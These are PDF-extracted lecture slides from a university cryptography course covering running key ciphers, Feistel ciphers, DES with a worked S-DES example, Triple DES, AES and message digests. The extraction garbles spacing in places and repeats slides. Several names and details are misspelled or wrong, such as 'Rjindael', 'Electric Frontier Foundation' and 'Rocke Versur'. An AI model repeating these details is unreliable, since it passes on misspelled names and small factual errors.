Ø Assume that there are only high - frequency letters ( aehinorst ) in the key and plaintext. Ø Then looking at the first 3 letters in the cipher text (trigram) – Le tt e r m c a n o nl y be c a u s e d by : e i , i e , t t . – Le tt e r o c a n o nl y be c a u s e d by : a o , o a , h h – Le tt e r i c a n o nl y be c a u s e d by : a i , i a , e e , r r Ø There are 36 possible combination (rather than 17,576 for all letters), with plaintext and key combinations: – ( eaa,ioi ); ( eai,ioa ); … ( the,the ) … ( thr,thr ) Ø Most are impossible in English, limiting the choices. Friedman's Attack: Example


<!-- Page 184 -->

Vernam Cipher Ø A variant of the running key cipher converts the characters of the key and plaintext to binary form first before combining them. Ø This was first used with the 5 - bit Baudot telegraph code, but will also work with modern ASCII.


<!-- Page 185 -->

Ø The bits are combined using the Exclusive - OR (XOR) c i = p i Å k i p i = c i Å k i Ø Remember the p roperties of XOR operator • 2 bits the same → 0; different → 1; • a Å a = 0; a Å 0 = a • p’= c Å k = p Å k Å k = p Å 0 = p Ø XOR with the same key twice cancels out ( a Å a = 0 ) . – This makes XOR good for cryptography. Vernam Cipher


<!-- Page 186 -->

Ø If the key is a random series of letters, then this encryption algorithm cannot be broken à it is called One Time Pad. Ø The key, however, is very long and cannot be used more than once . Ø It would be convenient to be able to generate the long key from a shorter starting point. One Time Pad


<!-- Page 187 -->

Pseudo - Random Number: Running Key Cipher Ø One apparent way of generating a large number of key values from a small actual key is to use a pseudo - random number generator . – See later for more details on random number generators. – Just provide the initial value for the generator, the actual key: • It is called the Seeds Ø Then use pseudo - random numbers, which appear to be random, in the running key algorithm.


<!-- Page 188 -->

► This does not work in general, and there are standard techniques for breaking such ciphers Ø Which are surprisingly common among amateur cryptographers. ► The apparently random values do in fact have a structure which can be exploited. ► This technique will, however, work if a cryptographically secure pseudo - random number generator is used (see later). ► A secure type of pseudo random number generator Pseudo - Random Number: Running Key Cipher


<!-- Page 189 -->

Lorenz Cipher Ø This was a Vernam cipher with a running key provided by a pseudo - random number generator. – Used by the Germans in WWII – The pseudo - random number was a mechanical device (12 gear wheels) that produced a series of 5 - bit values. – It was used to encrypt quite long documents. Ø The weakness in the random number generator was exploited by differential cryptanalysis. – Two cipher text letters are combined using XOR. Ø It was broken by Colossus, the first large - scale electronic computer , which became operational in December 1943.


<!-- Page 190 -->

Polygram Substitution: Block Ciphers Ø Frequency attacks are weakened by encrypting blocks of characters at a time rather than single letters . Ø There is a smaller chance that the two blocks will be the same. Ø This is too complicated to do with a mechanical device, but electronic computers make it possible. Ø This brings us to the block ciphers of the modern era.


<!-- Page 191 -->

Quizzes 10. Define the basic structure shared by all running key encryption algorithms. 11. Agent Alice has to communicate with various operatives around the world, sending them long text messages. She decides to communicate with them using a literature - based version of the running key algorithm, where the reference document is the Unix man page for the sh command, available to all of her operatives. How does this algorithm function and what is the key? 12. This algorithm is not secure. Briefly describe how it can be attacked.


<!-- Page 192 -->

Lecture Summary


<!-- Page 193 -->

Polyalphabet and Running Key Ø A polyalphabet cipher uses a different substitution for each letter in the plain text. – Repeating eventually. – A mechanical encryption device can implement this easily with rotors ( Rotor Machine ). Ø A running key cipher takes this to the extreme with a key just as long as the plain text. – A short key generator is often used. – Starting position in a book. – Starting position for a pseudo - random number generator.


<!-- Page 194 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 195 -->

Lecture 3: Symmetric - key Cryptography Block Ciphers


<!-- Page 196 -->

Lecture 2: Review


<!-- Page 197 -->

1. Types of attack : – Ciphertext only – Known (part of) plaintext and ciphertext, find the key – Chosen plaintext 2. Attack Methods: – Brute Force – Letter Frequency • Diagram and Trigram Main Points to take home


<!-- Page 198 -->

3. Transposition ciphers: – Split characters into blocks of fixed length d . – Rearrange the characters inside a block according to a key - dependent permutation. – Decryption uses the inverse permutation to recover the plaintext. 4. Substitution ciphers: – Provide a matching between letters in the plaintext alphabet to other letters in the same or a different alphabet for the ciphertext. – Shift Substitution – Multiplicative Substitution Main Points to take home


<!-- Page 199 -->

5. Homophonic ciphers: – A homophonic cipher has more letters in the ciphertext alphabet than in the plaintext alphabet. • Each plaintext letter can be replaced by a choice of several ciphertext letters (chosen at random). • This reduces the effect of statistics. – A second - order homophonic encrypts two different messages, each with their own key, into one piece of cipher text. • An innocent message is protected by a distress key. Main Points to take home


<!-- Page 200 -->

5. Polyalphabet ciphers: – A polyalphabet cipher uses a different substitution for each letter in the plain text. • Repeating eventually. • A mechanical encryption device can implement this easily with rotors ( Rotor Machine ). 6. Running Key ciphers: – A running key cipher takes this to the extreme with a key just as long as the plain text. – A short key generator is often used such as a pseudo - random number generator. Main Points to take home


<!-- Page 201 -->

Lecture 3: Overview


<!-- Page 202 -->

1. Feistel ciphers – A family of single - key, block substitution ciphers 2. Data Encryption Standard (DES) – 64 - bit Block cipher, 56 - bit key length – Insecure for modern applications – Still widely used 3. Advanced Encryption Standard (AES) – 128 - bit Block cipher, different key lengths (128, 192, 256) – Replacement for DES Outline


<!-- Page 203 -->

https://cybermeteoroid.com/stream - cipher - and - block - cipher - a - complete - overview/ Block Ciphers


<!-- Page 204 -->

Ø This is a family of single - key, block substitution ciphers. Ø Feistel was in charge of the IBM Lucifer project (1973) and provided the theoretical underpinning for many of the first block ciphers. – His work was based on Shannon (1945) Ø He proposed 64 - bit or 128 - bit block sizes. Feistel Ciphers


<!-- Page 205 -->

Ø The key is the mapping between input and output blocks. Ø If all possible mappings are possible then the keys would be 10 89 bits long for a block size of 64. – Stirling’s approximation of 64! . – There are thus a lot of possible keys. Ø The actual size of the key space was reduced, with a key length of 128 bits. – Still 2 128 or approximately 10 38 different keys. Feistel Ciphers: the Keys


<!-- Page 206 -->

Ø Feistel used a product cipher . – Several small transformations are applied one after the other. Ø He alternated substitutions and transpositions. Ø The resulting large transformation is likely to be much harder to break than each of the individual transformations. Ø Each substitution uses a sub - key, which is generated from the master key. Feistel Ciphers: Product Ciphers


<!-- Page 207 -->

Ø The initial data block is split into two halves, the left ( L0 ) and right ( R0 ) halves. – Actual operations involve just one - half of each data block and so fewer bits. Ø Computer word size at the time was 32 bits. – Each half block was 32 bits and so fitted in one computer word. – This sped up data processing. Ø There are a number of rounds n , each making a substitution followed by swapping the two halves (the transposition). Feistel Ciphers: the Structure


<!-- Page 208 -->

Encrypt plaintext (L 0, R 0 ): Ø For each round i = 0,1,2, …, n: • Input: L i , R i , and K i (round key) • Output: L i and R i • A substitution is performed on the left half L i • A permutation is performed by swapping the two halves. Ø Then the ciphertext is ( R n+ 1 , L n+ 1 ) v F is any function, there are several different Feistel algorithms, each with a different function F . v K i is a round key (i.e., sub - key), ⊕ is E xclusive OR. 𝑳 𝒊 " 𝟏 = 𝑹 𝒊 𝑹 𝒊 " 𝟏 = 𝑳 𝒊 ⊕ 𝑭 ( 𝑹 𝒊 , 𝑲 𝒊 ) https://en.wikipedia.org/wiki/Feistel_cipher 𝑳 𝒊 ⊕ 𝑭 ( 𝑹 𝒊 , 𝑲 𝒊 ) Feistel Ciphers: Encryption Algorithm


<!-- Page 209 -->

Ø Block size: The larger it is, the more secure the cipher is but the slower the cipher is. – 64 or 128 - bit Ø Key size: The larger it is, the more secure the cipher is but the slower the cipher is. – 64 or 128 bits Ø Number of rounds n: The larger it is, the secure the cipher is but the slower the cipher is. – 16 rounds is typical. Ø Sub - key Generation K i: – The more complex it is, the more secure the cipher is but the slower the cipher is. Ø Function F : – The more complex it is, the more secure the cipher is but the slower the cipher is. Feistel Ciphers: Design Features


<!-- Page 210 -->

https://en.wikipedia.org/wiki/Feistel_cipher Decrypt ciphertext (R n+1, L n+1 ): Ø For each round i = n, n - 1, …, 0: Then the plaintext is ( L 0 , R 0 ) again Ø The diagram illustrates both Encryption and Encryption processes Ø Note the reversal of the subkey order for decryption: this is the only difference between encryption and decryption. 𝑹 𝒊 = 𝑳 𝒊 " 𝟏 𝑳 𝒊 = 𝑹 𝒊 " 𝟏 ⊕ 𝑭 ( 𝑳 𝒊 " 𝟏 , 𝑲 𝒊 ) Feistel Ciphers: Decryption Algorithm


<!-- Page 211 -->

Ø Decryption follows the same steps but with the sub - keys used in the reverse order . Ø The same algorithm F and keys are used for encryption and decryption Ø To prove this works, all we need to do is show that two applications of each substitution step, with the same key, cancel each other. Ø From the formula: Swapping left and right halves will cancel each other out. – Swap two items and then swap them again. They are back in the same place. https://en.wikipedia.org/wiki/Feistel_ciphe r Feistel Ciphers: Decryption Algorithm


<!-- Page 212 -->

We’re going to prove that Two substitutions cancelled Consider any round i : Ø Let B i = (L i , R i ) be a block, split into left and right halves. B i = (L i , R i ) is the initial plain t ext block. B encrypt = ( L encrypt , R encrypt ) is ciphertext after encryption. B decrypt = ( L decrypt , R decrypt ) is plaintext after decryption. Ø All we need do is show that L decrypt = L i and R decrypt = R i Feistel Ciphers: Proof


<!-- Page 213 -->

We’re going to prove that two substitutions cancelled Ø Applying the Feistel function , we have : – For Encryption: L encrypt = R i R encrypt = L i ⊕ F(R i , K i ); The ciphertext to be decrypted is ( L encrypt, R encrypt ) – For Decryption R decrypt = L encrypt = R i L decrypt = R encrypt ⊕ F(L encrypt , K i ) = L i ⊕ F(R i , K i ) ⊕ F(L encrypt , K i ) = L i ⊕ F(R i , K i ) ⊕ F(R i , K i ) = L i ⊕ 0 = L i Feistel Ciphers: Proof


<!-- Page 214 -->

Ø No output bit is close to a linear function of a subset of the input bits. Ø If they were it would be vulnerable to a chosen plaintext attack (linear cryptanalysis). – Choose several plaintext messages whose bits form a linear combination – Solve the linear equations. Ø There is no bias towards some bit positions. Ø If two different inputs (key or data) differ by 1 bit, the output must differ by at least two bits. – Confusion and diffusion. Feistel Ciphers: Function F Design Criteria


<!-- Page 215 -->

Ø The Feistel family of algorithms were designed to be fast. – The block size was two computer words. Al l the calculations were done in a single computer word of 32 bits (half of the block). – There were several rounds with sub - keys generated from the master key. – In each round: • A substitution is performed on the left half L i • A permutation is performed by swapping the two halves. – Decryption used the same algorithm but with the subkeys in the reverse order. Summary


<!-- Page 216 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 217 -->

Lecture 3: Symmetric - key Cryptography Block Ciphers


<!-- Page 218 -->

Lecture 3: Overview


<!-- Page 219 -->

1. Feistel ciphers – A family of single - key, block substitution ciphers 2. Data Encryption Standard (DES) – 64 - bit Block cipher, 56 - bit key length – Insecure for modern applications – Still widely used 3. Advanced Encryption Standard (AES) – 128 - bit Block cipher, different key lengths (128, 192, 256) – Replacement for DES Outline


<!-- Page 220 -->

Ø The Feistel family of algorithms were designed to be fast. – The block size was two computer words. Al l the calculations were done in a single computer word of 32 bits (half of the block). – There were several rounds with sub - keys generated from the master key. – In each round: • A substitution is performed on the left half L i • A permutation is performed by swapping the two halves. – Decryption used the same algorithm but with the subkeys in the reverse order. Feistel Ciphers: Summary


<!-- Page 221 -->

Ø DES stands for Data Encryption Standard. Ø It is now an older algorithm but still widely used . – There is a lot of legacy hardware and software. Ø It is a Feistel block cipher , working with 64 - bit data blocks and 56 - bit keys. Data Encryption Standar d


<!-- Page 222 -->

Ø The NSA (US National Security Agency) modified the Lucifer cipher slightly and it was adopted in 1977. – They reduced the key length to 56 bits. – It uses elementary operations so that it is fast and easy to implement in silicon. Ø The NSA did not publish an analysis of its security, encouraging some to think they had inserted a backdoor. – No back door has been found but NSA later said that they had changed the algorithm to protect against differential cryptography. – Rival algorithms, such as IDEAL (also a Feistel algorithm) in Europe, were found to be vulnerable to differential cryptography. DES Origins


<!-- Page 223 -->

Ø DES is based on the Feistel cipher Ø 16 rounds as in Feistel structure Ø Two additional rounds at the beginning Initial Permutation ( IP ) and at the end Final Permutation ( FP ) Ø We will go into detail about IP, FP, F function, and sub - keys generation from a master key https://en.wikipedia.org/wiki/Data_Encryption_Standard 𝑳 𝒊 " 𝟏 = 𝑹 𝒊 𝑹 𝒊 " 𝟏 = 𝑳 𝒊 ⊕ 𝑭 ( 𝑹 𝒊 , 𝑲 𝒊 ) DES Overview


<!-- Page 224 -->

Ø To understand how DES works, we study a toy system Simplified - DES (S - DES) developed by Edward Schaefer of the University of Santa Clara. Ø S - DES encrypts 8 - bit blocks of data using a 10 - bit key. Ø There are two substitution rounds, each with its own sub - key. Ø Left and right halves are swapped between them. Ø Let us generate a sample data block and sample key to work through the S - DES algorithm . • Data = 00111110 • Key = 1011000110 Simplified DES


<!-- Page 225 -->

Ø The initial permutation (IP) operates on the 8 - bit data blocks . Ø If the data bits are numbered 0... 7 then the Initial Permutation is 15203746 . Ø Permuted data is : 00111110 à 01101011 Ø The inverse permutation (Final Permutation) applied at the end of the process is 30246175 . IP8 1 5 2 0 3 7 4 6 FP8 3 0 2 4 6 1 7 5 The Initial Permutation


<!-- Page 226 -->

Sub - key Generation


<!-- Page 227 -->

Sub - keys Generation Two 8 - bit sub - keys are generated from the 10 - bit master key. Step 1 : The bits of the original key are permuted based on P10 permutation table: Key = 1011000110 à 1000101110 Step 2: The left 5 bits and the right 5 bits are both rotated left 1 bit. 10001 0 1110 à 00011 11100 Step3: The first 8 - bit sub key is formed from the following matching 8 - bit table : We then have: K 1 = 10111100 P10 2 4 1 6 3 9 0 8 7 5 P8 5 2 6 3 7 4 9 8


<!-- Page 228 -->

Sub - keys Generation Step 4: The left and right 5 bits from step 2 are both rotated left 2 bits 00011 11100 à 01100 10011 Step 5: The second 8 - bit sub key is formed from the same bits as step 3 (using P8 permutation table again ) K 2 = ??? P8 5 2 6 3 7 4 9 8


<!-- Page 229 -->

F function in details Ø The most complex component in S - DES is the function F Ø Defined by steps as shown in the diagram : Step 1: Expansion of 4 data bits (right half of block) to 8 bits following the E/P table 30121230 Permuted data : 0110 1011 à 11010111 Step 2: These 8 bits are XOR’ed with the 8 bits of the first key K 1 . 11010111 10111100 (Key ) Output: 01101011 Simplified DES - Function F(R,SK)


<!-- Page 230 -->

F function in details Step 3: The resulting 8 bits (numbered 0 1 2.. 7 ) are split again into 4 separate 2 - bit numbers called ( row 1 , col 1 ), ( row 2 , col 2 ) as following rule : row 1 = bits: 0,3 ; col 1 = bits: 1,2 row 2 = bits: 4,7 ; col 2 = bits: 5,6 01101011 è (00, 11 ) , (11, 01 ). In decimal, row 1 = 0 , col 1 = 3 , row 2 = 3, col 2 = 1 . Step 4: ( row 1 ,col 1 ) and (row 2 ,col 2 ) form the row and column indices of two 4x4 tables called Substitution - boxes (S - boxes ) • An S - box is a matrix, indexed by the row and column . • Each S - box produces 2 bits of output. S1( 0, 3 ) = 10 , S2(3 , 1 ) = 01 So , output = 1001 Substitution Boxes (S - Boxes) lookup table in decimal S1 S2 1 0 3 2 0 1 2 3 3 2 1 0 2 0 1 3 0 2 1 3 3 0 1 2 3 1 0 2 2 1 0 3


<!-- Page 231 -->

F function in details Step 5: The resulting 4 - bit number, the output from the two S - boxes undergoes another permutation with P4 table 1320 which is the output of the function F The algorithm continues: Step 6: The Switch function (SW) interchanges the left and right 4 bits so that the second instance of f K operates on a different 4 bits. Step 7: In this second instance, the E/P, S0, S1, and P4 functions are the same. The key input is K2 . Step 8: Finally apply inverse permutation (i.e., Final Permutation) to get the ciphertext . P4 1 3 2 0


<!-- Page 232 -->

Relationship with the Real DES Ø DES has the same structure as S - DES, but with more steps . Ø There are 16 F K steps, each with a 48 - bit sub - key generated from the 56 - bit actual key . Ø The function F operates on 32 - bit halves of the data. – The data is expanded to 48 bits and XOR’ed with the sub - key. – These 48 bits are split into 8 chunks, each 6 bits long. – Each 6 - bit chunk is treated as row (2 bits) and column (4 bits) – They each index an S - box. Ø Internally it has 8 S - Boxes, each 4 x 16. – Each S - Box produces a 4 - bit number. – The 8 S - Boxes produce a 32 - bit value.


<!-- Page 233 -->

Results from more steps in DES Ø The following table lists the number of bits that have changed after each round of DES with – two very similar plaintext blocks (diffusion). – two very similar keys (confusion). Ø Clearly, diffusion and confusion are quite effective. Ø Permutations on their own do not affect confusion or diffusion. – 1 - bit change in the origin only changes one bit in the destination.


<!-- Page 234 -->

16 steps: Number of Different Bits in DES Round Confusion Diffusion 1 6 2 2 21 14 3 35 28 4 39 32 … … … 10 44 38 11 32 31 12 30 33 13 30 28 14 29 34 15 29 34 16 34 35


<!-- Page 235 -->

Design of the S - Boxes Ø The design principles were published in 1992, answering questions that NSA had introduced a trap door. – There was no trap door. Ø The design made DES resistant to differential cryptanalysis, which NSA had known about but kept secret. Ø Other Feistel ciphers were vulnerable to differential analysis. Ø Differential Cryptanalysis uses two very similar chosen plaintext messages to uncover details of the encryption algorithm. Ø Linear cryptanalysis is a similar attack that relies on two similar known plaintext messages. – DES is also resistant to it.


<!-- Page 236 -->

Breaking DES Ø The short key length of 56 bits makes DES vulnerable to a brute force attack , where all keys are tried. Ø On 29 th Jan 1997, the RSA organisation offered a prize of $10,000 to the first person to find the key to some cipher text when they were given 3 blocks of plain text (a known plaintext attack ). – Rocke Versur claimed the prize on 25 th May 1997 . Ø In 1976 Hellman and Diffie estimated that it would cost $ 20M to build a special - purpose machine to crack DES in 1 day. Ø In 1998 The Electric Frontier Foundation built a DES cracker for $250,000. It could search all possible keys in 9 days . Ø DES lasted 20 years before it became easy to crack.


<!-- Page 237 -->

Double DES Ø Double DES uses two different keys to encrypt twice . – C = E K2 (E K1 (P )) Ø It is vulnerable to a known plaintext (assume P and C are known ): meet in the middle attack . Ø Construct a lookup table of all intermediate results: X = E K1 (P) for all possible keys K 1 . Ø Decrypt C for all possible keys K 2 : Y = D K2 (C). Ø The key we want is when X = Y. Ø Look up each value of Y in the table of X’s. Ø This takes about twice the effort needed to break the standard single - key DES. Ø It is NOT equivalent to using a 56x2 = 112 - bit key.


<!-- Page 238 -->

Triple DES Ø Three Key Triple DES – C = E K3 ( D K2 (E K1 (P))) – No known weaknesses. – Decryption with the second key is used so that if the same key is used three times then this is equivalent to single DES. – There are many legacy documents encrypted with original DES. Ø There are 3 options: – K 1 , K 2 , K 3 are all different: 168 - bit key – K 1 = K 3 , K 2 different: 112 - bit key avoiding meet in the middle. – K 1 = K 2 = K 3 : 56 - bit key, equivalent to single DES.


<!-- Page 239 -->

Summary Ø DES was an implementation of the Feistel scheme • The chosen key length of 56 bits was too short • It used fairly random lookup tables in each round. • All the operations were fast and required a small amount of computation. • The short key length led to it being broken about 20 years after adoption. • The triple - DES version is secure and still in use in major applications


<!-- Page 240 -->

Quizzes 1. How are encryption and decryption performed with a Feistel cipher? Prove that decryption undoes encryption. 2. Describe briefly how the DES algorithm implements the Feistel scheme, mentioning , in particular, the role of the key length and also the so - called S - Boxes. You do not need to provide details of the actual S - Boxes, rather describe in general terms their role in the algorithm. 3. Imagine you have the task of designing a hardware encryption device based on DES chips. Your company anticipates that a well - funded organisation will make a serious attempt to break the data encrypted by your device. How would you choose to employ the DES chips?


<!-- Page 241 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 242 -->

Lecture 3: Symmetric - key Cryptography Block Ciphers


<!-- Page 243 -->

Lecture 3: Overview


<!-- Page 244 -->

1. Feistel ciphers – A family of single - key, block substitution ciphers 2. Data Encryption Standard (DES) – 64 - bit Block cipher, 56 - bit key length – Insecure for modern applications – Still widely used 3. Advanced Encryption Standard (AES) – 128 - bit Block cipher, different key lengths (128, 192, 256) – Replacement for DES Outline


<!-- Page 245 -->

Why is AES necessary?


<!-- Page 246 -->

Advanced Encryption Standard (AES) Ø The NIST (US National Institute for Standards and Technology) started a search for a replacement for DES once its deficiencies became apparent. Ø The design of AES was performed in public, unlike DES. • Entries were invited from around the world. • The algorithms and analysis were made public. • Comments were invited from any organisation .


<!-- Page 247 -->

The Competition Ø MARS from IBM Ø RC6 from RSA Security Ø Twofish from Counterpane (Bruce Schneier ) Ø Serpens from Ross Anderson, Eli Bihan , Lars Knudsen (Cambridge University Academic lead team) Ø Rjindael from Joan Daemen and Vincent Rjimen (Belgian academics) Ø The winner, announced in 2000, was Rjindael .


<!-- Page 248 -->

The Rjindael Algorithm Ø AES is based on a design principle known as a Substitution - Permutation network (SP network). AES does not use Feistel ciphers Ø Rijndael is an iterated block cipher, meaning that it encrypts and decrypts a block of data by the iteration or round of a specific transformation. Ø Similar to DES but used calculations involving polynomials rather than table lookups in S - Boxes . Ø Most arithmetic is performed with 8 - bit values and uses polynomials mod the irreducible polynomial x 8 + x 4 + x 3 + x + 1. Ø The multiplication lookup table can be implemented in hardware.


<!-- Page 249 -->

Rjindael Blocks and States Ø The algorithm can be used with data lengths of 128, 192 or 256 bits, and also key lengths of 128, 192 or 256 bits. Ø We will just consider the ( 128, 128) versions. Ø Other versions are similar but have more rounds. Ø In what follows – The key K is 128 bits long. – Each block S is 128 bits long, i.e. 16 bytes called s i . Ø The algorithms for encryption and decryption are related but different. Ø The (128, 128) version of the algorithm has 10 rounds, each with its own 128 - bit sub - key K[ i ] .


<!-- Page 250 -->

AES Applications


<!-- Page 251 -->

AES Encryption Algorithm Ø AES operates on a 128 - bit plain text block as a single 4X4 matrix which would have a total size of 16 bytes. Every 4 bytes would represent a word . Ø The 128 - bit key is expanded to form an array containing four 32 - bit words. At each round, four distinct words (e.g., W0, W1, W2, W3) are served to the round key process from the expanded key . Ø A round has four functions among which one is of permutation and three are of substitution: – Substitute Byte, Mix Column and Add Round Key functions are substitution functions – Shift Rows is a permutation function . Ø Only the Add Round key function makes use of the key.


<!-- Page 252 -->

AES Encryption Algorithm AddRoundKey (S, K[0 ]); for (int round = 1; round <= 10; round ++){ SubBytes (S ); ShiftRows (S ); if (round != 10) //Not final round MixColumns (S ); AddRoundKey (S,K[round ]); }


<!-- Page 253 -->

Function: AddRoundKey (S,K) Ø This is very simple. Ø S and K are XOR’ ed bit - by - bit , and the result is left in S.


<!-- Page 254 -->

Function: AddRoundKey (S,K)


<!-- Page 255 -->

Function: SubBytes (S) SubBytes function is a simple transform which converts 8 - bit data to other 8 - bit data: Ø 8 - bit polynomial arithmetic is used. Ø s, x, y a re a l l 8 - b i t v a l u e s . Ø x = s - 1 w h e r e t he in v e r s e o f 0 i s 0. Ø y = Mx , where the matrix M h as single - bit entries : Ø Bitwise arithmetic is used: + / - / XOR . Ø y now r e p l ace s t he o l d v a l ue of s . 1 0 0 0 1 1 1 1 1 1 0 0 0 1 1 1 1 1 1 0 0 0 1 1 1 1 1 1 0 0 0 1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 0 0 0 0 1 1 1 1 1 0 0 0 0 1 1 1 1 1


<!-- Page 256 -->

Function: SubBytes (S)


<!-- Page 257 -->

The Matrix M Ø This simple structure of the matrix M allows a formal proof that the algorithm is resilient to attacks by differential and linear cryptanalysis . Ø This contrasts with the choice of S - boxes in the DES algorithm, which looks like they were chosen randomly.


<!-- Page 258 -->

Function:ShiftRows (S) Ø The S hiftRows and MixColumns subroutines ensure that all bytes interact with each other in the algorithm . Ø They both treat the 16 bytes of the state S as a 4x4 matrix . Ø ShiftRows is just a simple shift of the 4 bytes in each row . Ø The amount of shift increases with each row. s 0 s 1 s 2 s 3 ® s 0 s 1 s 2 s 3 s 4 s 5 s 6 s 7 ® s 5 s 6 s 7 s 4 s 8 s 9 s 1 0 s 11 ® s 10 s 11 s 8 s 9 s 12 s 1 3 s 1 4 s 12 ® s 15 s 12 s 13 s 14


<!-- Page 259 -->

Function:ShiftRows (S)


<!-- Page 260 -->

Function: MixColumns (S) Ø The 16 bytes can be represented as a 4x4 matrix. Ø Each column of 4 bytes is treated as a cubic polynomial in X, with 8 - bit coefficients, the polynomial for the 0 th column is: s 0 + s 4 X + s 8 X 2 + 12 X 3 Ø Each column polynomial is multiplied by a fixed polynomial with 8 - bit coefficients which are: – Where coefficients are 8 - bit polynomials P 1 = 1, P 2 = x, P 3 = x + 1. – Naturally, each 8 - bit coefficient also uses polynomial arithmetic ! Ø These polynomials are reduced mod another polynomial X 4 + 1 – This is not irreducible, and so care has to be taken to choose numbers that have inverses. col 0) P 2 + P 3 X + P 1 X 2 + P 1 X 3 col 1) P 1 + P 2 X + P 3 X 2 + P 1 X 3 col 2) P 1 + P 1 X + P 2 X 2 + P 3 X 3 col 3) P 3 + P 1 X + P 1 X 2 + P 2 X 3


<!-- Page 261 -->

Function: MixColumns (S)


<!-- Page 262 -->

AES Decryption Ø Inverse operations are performed in the reverse order . Ø MixColumns , ShiftRows and SubBytes e ach have a simple inverse operation that can undo its effects . Ø AddRoundKey is i t s o w n i n v e r se . Ø InverseSubBytes mu ltiplies by the reverse 8 - bit matrix, and then calculates the polynomial inverse . Ø InverseShiftRows s hift s l e f t r a t h e r t h a n r i g h t . Ø InverseMixColumns inv e r t s t he c o l u m n m a t r i x a nd p e r f o r m s t he same calculations.


<!-- Page 263 -->

Sub - key Generation Ø We need to produce 10+1 round keys, each of 128 bits, from the initial 128 - bit key . Ø Similar operations are used to generate the sub - keys. – Shifts – 8 - bit polynomial arithmetic. – Exclusive OR.


<!-- Page 264 -->

DES and AES in Comparison DES Algorithm AES Algorithm Key Length - 56 bits Key Length - 128, 192, 256 bits Block Size - 64 bits Block size - 128 bits Fixed no. of rounds No. of rounds dependent on key length ( 10, 12, and 14 ) Slower and less secure Faster and more secure


<!-- Page 265 -->

Summary Ø AES was adopted after an open competition . Ø It uses many rounds, each with its own sub - key. Ø All the operations are fast and don’t require much silicon . Ø The basic transformations use mathematics so it can be proved to be secure from all known attacks . Ø Both the key and block size can be 128, 192 or 256 bits long.


<!-- Page 266 -->

Quizzes 4. Describe how the process of choosing the AES algorithm was different from the one that led to DES. Was the new process better or worse ? In what ways is AES better than DES? 5. Describe how the Rjindael AES encryption algorithm uses polynomial arithmetic. What is the advantage of using this arithmetic over the use of S - boxes in DES?


<!-- Page 267 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 268 -->

Lecture 4: Message Digests, Random Numbers and Secret Sharing


<!-- Page 269 -->

Lecture 3: Revie w


<!-- Page 270 -->

Main points to take home 1) The Feistel family of algorithms were designed to be fast. – The block size was two computer words. Al l the calculations were done in a single computer word of 32 bits (half of the block). – There were several rounds with sub - keys generated from a master key. – In each round: • A substitution is performed on the left half L i • A permutation is performed by swapping the two halves. – Decryption used the same algorithm but with the sub - keys in the reverse order.


<!-- Page 271 -->

2. DES was an implementation of the Feistel scheme . – The chosen key length of 56 bits was too short. – It used fairly random lookup tables in each round. – All the operations were fast and required a small amount of computation. – The short key length led to it being broken about 20 years after adoption. – The triple - DES version is secure and still in use in major applications . Main points to take home


<!-- Page 272 -->

Ø Simplified - DES – To understand how DES works, we study a toy system Simplified - DES (S - DES) developed by Edward Schaefer of the University of Santa Clara. – S - DES encrypts 8 - bit blocks of data using a 10 - bit key. – There are two substitution rounds, each with its own sub - key. – Left and right halves are swapped between them. Main points to take home


<!-- Page 273 -->

3. AES was adopted after an open competition. – It uses many rounds, each with its own subkey. – All the operations are fast and don’t require much silicon. – The basic transformations use mathematics so it can be proved to be secure from all known attacks. – Both the key and block size can be 128, 192 or 256 bits long. Main points to take home


<!-- Page 274 -->

AES Encryption Algorithm AddRoundKey (S, K[0]); for (int round = 1; round <= 10; round++){ SubBytes (S); ShiftRows (S); if (round != 10) //Not final round MixColumns (S); AddRoundKey (S,K[round]); }


<!-- Page 275 -->

Reading Session Ø The following table lists the number of bits that have changed after each round of DES with – two very similar plaintext blocks (diffusion). – two very similar keys (confusion). Ø Diffusion and confusion are quite effective. Ø Permutations on their own do not affect confusion or diffusion. – 1 - bit change in the origin only changes one bit in the destination. Round Confusion Diffusion 1 6 2 2 21 14 3 35 28 4 39 32 … … … 10 44 38 11 32 31 12 30 33 13 30 28 14 29 34 15 29 34 16 34 35


<!-- Page 276 -->

Quizzes 1. What is Differential Cryptanalysis? 2. For DES, at round 4 , the Confusion and Diffusion are quite effective enough. Why do we need to perform the algorithm until round 16 ?


<!-- Page 277 -->

Lecture 4: Message Digests, Random Numbers and Secret Sharing


<!-- Page 278 -->

Outline 1. Message Digest – Message Digest Concept – Design a Hash Function 2. Random Numbers – Real Random numbers – Pseudo - random numbers – Cryptographically Secure Pseudo - random numbers 3. Secret Sharing (Multiple key cryptography) – Secret Splitting – Secret Sharing


<!-- Page 279 -->

Message Digest Concept Ø The message digest (MD) of a message is a smaller ‘ fingerprint ’ that can uniquely identify the message. Ø A message digest can be signed with a secret key. – Message Authentication Code (MAC) Ø It will be just as valid as a signed version of the original document. – Provided a different document with the same message digest cannot be created.


<!-- Page 280 -->

Requirements of Message Digest 1. Given the message, it is easy to compute the message digest . 2. Given the message digest, it is hard to compute the message . 3. Given a message M , it is hard to find another message M' with the same message digest. – This is also called a pre - image collision attack . 4. It should be hard to find two random messages M and M' with the same message digest . – This is also called a collision attack or a birthday attack .


<!-- Page 281 -->

Requirements of Message Digest Easy to compute, hard to reverse: Ø Requirement 1: easy to compute MD Ø Requirement 2: implies that the hash function cannot be reversed, and the original message must be long enough. – If the message were only 64 bits long, for example, then a B rute F orce attack could be used . – Try all possible 64 - bit messages, seeing which produces the required digest.


<!-- Page 282 -->

